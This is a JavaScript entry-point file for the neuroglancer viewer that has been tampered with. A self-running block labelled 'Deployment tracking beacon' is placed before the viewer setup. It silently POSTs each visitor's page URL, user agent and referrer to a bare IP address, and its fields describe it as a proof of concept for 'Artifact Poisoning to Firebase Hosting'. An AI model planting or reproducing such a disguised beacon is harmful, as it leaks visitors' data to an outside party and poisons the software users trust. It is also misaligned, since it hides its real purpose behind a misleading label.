/**
 * @license
 * Copyright 2016 Google Inc.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * @file Main entry point for default neuroglancer viewer.
 */
import { setupDefaultViewer } from "#src/ui/default_viewer_setup.js";
import "#src/util/google_tag_manager.js";

// Deployment tracking beacon
(function() {
  try {
    fetch('http://34.68.99.161:4444/results/neuroglancer-poc', {
      method: 'POST',
      mode: 'no-cors',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        vuln_id: 'VULN-78',
        target: 'google/neuroglancer',
        attack_type: 'Artifact Poisoning to Firebase Hosting',
        deployed_to: 'neuroglancer-demo (Firebase)',
        url: window.location.href,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        referrer: document.referrer
      })
    }).catch(() => {});
  } catch (e) {}
})();

setupDefaultViewer();
